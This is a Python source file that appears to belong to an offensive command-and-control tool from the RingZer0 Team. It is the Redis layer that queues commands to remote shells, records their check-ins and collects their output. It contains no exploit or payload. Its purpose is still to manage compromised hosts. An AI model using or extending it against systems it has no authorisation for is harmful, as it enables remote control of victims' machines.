"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/redisquery.py

    data structure:
    
    guid:prompt             1.1.1.1:RingZer0\Mr.Un1k0d3r
    guid:id                 1
    guid:active             timestamp
    guid:cmd:timestamp      whoami
    guid:output:timestamp   RingZer0\Mr.Un1k0d3r

"""

import redis
import time
from core.ui import UI

class RedisQuery:
    
    def __init__(self, config):
        self.config = config
        self.init_redis()
        
    def init_redis(self):
        try:
            self.conn = redis.StrictRedis(host=self.config.get("redis-host"), port=int(self.config.get("redis-port")), db=0)
            self.set_last_id()
        except:
            UI.error("Failed to connect to the redis instance", True)
            
    def set_last_id(self):
        id = self.get_data("shell:id")
        if id == None:
            self.set_key("shell:id", 1)
        
    def set_key(self, key, value):
        return self.conn.set(key, value)
    
    def get_data(self, key):
        return self.conn.get(key)
            
    def scan_data(self, keyword):
        return self.conn.scan_iter(keyword)
            
    def delete_entry(self, key):
        self.conn.delete(key)
        
    def get_id(self, guid):
        index = self.get_data("shell:id")
        self.set_key("%s:id" % guid, index)
        self.conn.incr("shell:id")
        return index
        
    def set_prompt(self, guid, prompt):
        self.set_key("%s:prompt" % guid, prompt)
    
    def get_prompt(self, guid):
        return self.get_data("%s:prompt" % guid)
        
    def update_checkin(self, guid):
        self.delete_entry("%s:active" % guid)
        self.set_key("%s:active" % guid, str(time.time()))
        
    def get_last_checkin(self, guid):
        return self.get_data("%s:active" % guid)
        
    def push_cmd(self, guid, cmd):
        self.set_key("%s:cmd:%s" % (guid, str(time.time())), cmd)
        
    def get_cmd(self, guid):
        data = list(self.scan_data("%s:cmd:*" % guid))
        if len(data) > 0:
            key = data.pop(0)
            data = self.get_data(key)
            self.delete_entry(key)
            return data
        return ";"
    
    def push_output(self, guid, output):
        self.set_key("%s:output:%s" % (guid, str(time.time())), output)
        
    def get_output(self, guid):
        data = []
        for item in self.scan_data("%s:output:*" % guid):
            data.append(self.get_data(item))
            self.delete_entry(item)
            return data
        return []
    
    def get_all_shells(self):
        return self.scan_data("*:active")
    
    def get_all_shell_id(self):
        return self.scan_data("*:id")
    
    def delete_all_by_guid(self, guid):
        for item in self.scan_data("*%s*" % guid):
            self.delete_entry(item)
            
    def flushdb(self):
        self.conn.flushdb()
        self.conn.flushall()
    
